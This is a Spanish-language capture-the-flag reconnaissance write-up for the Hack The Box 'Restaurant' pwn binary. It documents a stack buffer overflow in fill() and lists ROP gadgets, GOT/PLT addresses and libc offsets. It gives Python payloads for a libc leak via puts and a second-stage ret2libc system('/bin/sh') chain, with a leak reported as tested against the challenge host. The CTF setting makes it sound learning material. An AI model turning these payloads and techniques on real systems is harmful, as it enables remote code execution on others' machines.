# Reconocimiento Completo - Restaurant CTF (Hack The Box)

## Información del Reto
- **Nombre**: Restaurant
- **Categoría**: Pwn
- **Dificultad**: Easy
- **Host**: 94.237.48.12:40939
- **Archivos**: Binario `restaurant` y `libc.so.6` (GLIBC 2.27)

---

## 1. Análisis del Binario

### 1.1 Información Básica
```
Archivo: restaurant
Tipo: ELF 64-bit LSB executable, x86-64
Arquitectura: x86-64
Enlazado: Dynamically linked
Debug: Not stripped
```

### 1.2 Protecciones de Seguridad
```
RELRO:           Full RELRO
Stack Canary:    NO ❌ (VULNERABLE)
NX:              Enabled (No Execute stack)
PIE:             NO ❌ (Direcciones fijas)
```

**Análisis de Protecciones:**
- ✅ **Full RELRO**: GOT no se puede sobrescribir después de la resolución
- ❌ **No Stack Canary**: Vulnerable a buffer overflow
- ✅ **NX Enabled**: No se puede ejecutar shellcode en el stack (necesario ROP)
- ❌ **No PIE**: Direcciones del binario son fijas y predecibles

---

## 2. Análisis de Funciones

### 2.1 Función `main()` (0x400f68)
```c
void main() {
    setup();
    // Imprime menú
    int opcion;
    scanf("%d", &opcion);
    
    if (opcion == 1) {
        fill();
    } else if (opcion == 2) {
        drink();
    } else {
        exit(0x105);
    }
}
```

### 2.2 Función `fill()` (0x400e4a) - **VULNERABLE**
```c
void fill() {
    char buffer[32];  // Buffer en [rbp-0x20]
    memset(buffer, 0, 32);
    
    // VULNERABILIDAD: Lee 0x400 (1024) bytes en un buffer de 32 bytes!
    read(0, buffer, 0x400);
    
    printf("Enjoy your %s\n", buffer);
}
```

**Análisis de la Vulnerabilidad:**
- Buffer de 32 bytes en `[rbp-0x20]`
- Lee **1024 bytes** con `read()`
- Buffer overflow de **992 bytes**
- Permite sobrescribir: saved RBP, return address, y más allá

### 2.3 Función `drink()` (0x400eed)
```c
void drink() {
    int choice;
    printf("What beverage would you like?\n1. Water.\n");
    scanf("%d", &choice);
    
    if (choice == 1 || choice == 2) {
        puts("Enjoy your drink!");
    } else {
        puts("Invalid option");
    }
}
```
- No es vulnerable
- Función normal sin buffer overflow

### 2.4 Función `setup()` (0x400dfd)
```c
void setup() {
    setvbuf(stdin, NULL, 2, 0);
    setvbuf(stdout, NULL, 2, 0);
    alarm(0x7f);  // 127 segundos de timeout
}
```

---

## 3. Direcciones Importantes (No PIE)

### 3.1 Funciones
```
main:       0x400f68
fill:       0x400e4a
drink:      0x400eed
setup:      0x400dfd
color:      0x400a4b
rainbow:    0x4007df
```

### 3.2 PLT (Procedure Linkage Table)
```
puts@PLT:   0x400650
printf@PLT: 0x400670
read@PLT:   0x400690
scanf@PLT:  0x4006c0
alarm@PLT:  0x400680
exit@PLT:   0x4006d0
setvbuf@PLT: 0x4006b0
```

### 3.3 GOT (Global Offset Table)
```
puts@GOT:   0x601fa8
printf@GOT: 0x601fb8
read@GOT:   0x601fc8
scanf@GOT:  0x601fe0
alarm@GOT:  0x601fc0
exit@GOT:   0x601fe8
strcmp@GOT: 0x601fd0
strlen@GOT: 0x601fb0
setvbuf@GOT: 0x601fd8
```

---

## 4. Gadgets ROP

### 4.1 Gadgets Encontrados
```
pop rdi; ret:           0x4010a3
pop rsi; pop r15; ret:  0x4010a1
ret:                    0x400eec
```

### 4.2 Notas sobre Gadgets
- `pop rdi` es esencial para pasar el primer argumento en calling convention x86-64
- `pop rsi` requiere también pop r15 (no ideal pero funcional)
- No se encontró `pop rdx` directo

---

## 5. Información de Libc

### 5.1 Versión
```
GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.4)
Versión: 2.27
```

### 5.2 Offsets de Funciones en Libc
```
puts:       0x0000000000080aa0
system:     0x000000000004f550
execve:     0x00000000000e4c00
```

### 5.3 Strings Útiles
```
/bin/sh:    0x1b3e1a
```

---

## 6. Vulnerabilidad Explotable

### 6.1 Buffer Overflow en fill()

**Ubicación del Stack:**
```
[rbp-0x20]  →  Buffer (32 bytes)
[rbp-0x18]  →  Buffer
[rbp-0x10]  →  Buffer
[rbp-0x08]  →  Buffer
[rbp]       →  Saved RBP (8 bytes)
[rbp+0x8]   →  Return Address (8 bytes)
```

**Offset para Sobrescribir RIP:**
- **40 bytes** (32 del buffer + 8 del saved RBP)

### 6.2 Prueba de Concepto

**Payload Básico:**
```python
payload = b'A' * 40         # Llenar buffer + saved RBP
payload += p64(RIP_address) # Sobrescribir return address
```

**Resultado:**
- ✅ Control total de RIP
- ✅ Capacidad de ejecutar ROP chain
- ✅ Buffer suficientemente grande (1024 bytes) para ROP chains complejas

---

## 7. Técnica de Leak de Libc

### 7.1 Método Utilizado
1. Usar ROP para llamar `puts(puts@GOT)`
2. Capturar la dirección real de puts en memoria
3. Calcular base de libc: `libc_base = leaked_puts - puts_offset`
4. Volver a `main()` para segunda etapa

### 7.2 Payload de Leak
```python
payload = b'A' * 40
payload += p64(0x4010a3)      # pop rdi; ret
payload += p64(0x601fa8)      # puts@GOT
payload += p64(0x400650)      # puts@PLT
payload += p64(0x400f68)      # main
```

### 7.3 Resultado Probado
```
✅ Leak exitoso: 0x7fd9f6e2caa0
✅ Retorno a main confirmado
✅ Posibilidad de segunda etapa de explotación
```

**Extracción del Leak:**
- El leak aparece después del mensaje "Enjoy your ..."
- Formato: 6 bytes terminando en `\x7f` (little endian)
- Offset en la respuesta: 54 bytes después del inicio de la línea

---

## 8. Vector de Ataque Completo

### 8.1 Etapa 1: Leak de Libc
1. Conectar al servidor
2. Seleccionar opción 1 (Fill my dish)
3. Enviar payload ROP para leak
4. Extraer dirección de puts
5. Calcular base de libc

### 8.2 Etapa 2: Explotación (Para siguiente fase)
1. El servidor vuelve a main después del leak
2. Calcular direcciones de:
   - `system` = libc_base + 0x4f550
   - `/bin/sh` = libc_base + 0x1b3e1a
3. Enviar payload final:
   ```python
   payload = b'A' * 40
   payload += p64(0x4010a3)        # pop rdi; ret
   payload += p64(binsh_address)   # "/bin/sh"
   payload += p64(system_address)  # system()
   ```

---

## 9. Notas de Seguridad del Servidor

### 9.1 Timeout
- Alarm de 127 segundos (0x7f)
- Suficiente para explotación manual o automatizada

### 9.2 Comportamiento del Servidor
- ✅ Servidor funcional: 94.237.48.12:40939
- ✅ Segmentation fault confirmado con buffer overflow
- ✅ Output del leak visible en respuesta
- ✅ Retorno a main funcional

---

## 10. Resumen de Hallazgos

### 10.1 Vulnerabilidades Críticas
1. **Buffer Overflow en fill()**: Lee 1024 bytes en buffer de 32
2. **No Stack Canary**: No hay protección contra buffer overflow
3. **No PIE**: Direcciones predecibles

### 10.2 Capacidades de Explotación
✅ Control total de RIP
✅ Leak de direcciones de libc
✅ Ejecución de ROP chains
✅ Retorno a main para multi-stage exploit
✅ Gadgets ROP disponibles
✅ Libc con system() y /bin/sh disponibles

### 10.3 Ruta de Explotación
```
1. Trigger buffer overflow en fill()
2. ROP chain para leak de libc (puts@GOT)
3. Retornar a main()
4. Calcular direcciones de system y /bin/sh
5. Segunda ROP chain: system("/bin/sh")
6. Shell remota
```

---

## 11. Archivos Generados Durante Reconocimiento

```
/workspace/restaurant_ctf/
├── Restaurant.zip              # Archivo original
├── pwn_restaurant/
│   ├── restaurant             # Binario ejecutable
│   └── libc.so.6              # Biblioteca libc 2.27
├── restaurant_disasm.txt       # Desensamblado completo
├── test_*.py                  # Scripts de prueba
├── exploit_leak*.py           # Scripts de leak probados
└── RECONOCIMIENTO_COMPLETO.md # Este documento
```

---

## 12. Comandos Útiles para Análisis

```bash
# Verificar protecciones
checksec --file=restaurant

# Desensamblado de función específica
objdump -M intel -d restaurant | grep -A 50 "<fill>:"

# Buscar gadgets ROP
python3 -m ropper --file restaurant --search "pop rdi"

# Ver símbolos de libc
readelf -s libc.so.6 | grep puts

# Buscar strings en libc
strings -a -t x libc.so.6 | grep "/bin/sh"

# Probar conexión
nc -zv 94.237.48.12 40939
```

---

## 13. Estado del Reconocimiento

### ✅ Completado
- [x] Descarga y extracción de archivos
- [x] Análisis de protecciones del binario
- [x] Identificación de vulnerabilidad buffer overflow
- [x] Cálculo de offset para RIP
- [x] Búsqueda de gadgets ROP
- [x] Identificación de direcciones GOT/PLT
- [x] Análisis de versión y offsets de libc
- [x] Prueba de leak de direcciones remoto
- [x] Verificación de retorno a main
- [x] Documentación completa

### 📋 Pendiente (Para Fase de Explotación)
- [ ] Desarrollo de exploit completo
- [ ] Cálculo automático de offsets de libc
- [ ] Construcción de segunda etapa ROP
- [ ] Obtención de shell remota
- [ ] Captura de flag

---

## Conclusión del Reconocimiento

El binario `restaurant` es **completamente vulnerable** a buffer overflow con las siguientes capacidades confirmadas:

1. **Control total de ejecución** mediante sobrescritura de return address
2. **Leak de libc funcional** para bypass de ASLR
3. **ROP gadgets disponibles** para construcción de exploit
4. **Segunda etapa posible** mediante retorno a main
5. **System y /bin/sh disponibles** en libc para shell

La explotación es **altamente viable** y requiere:
- Leak de libc (Primera conexión)
- Cálculo de offsets
- ROP chain a system("/bin/sh") (Segunda conexión)

**Severidad: CRÍTICA**
**Explotabilidad: ALTA**
**Impacto: COMPLETO (RCE)**
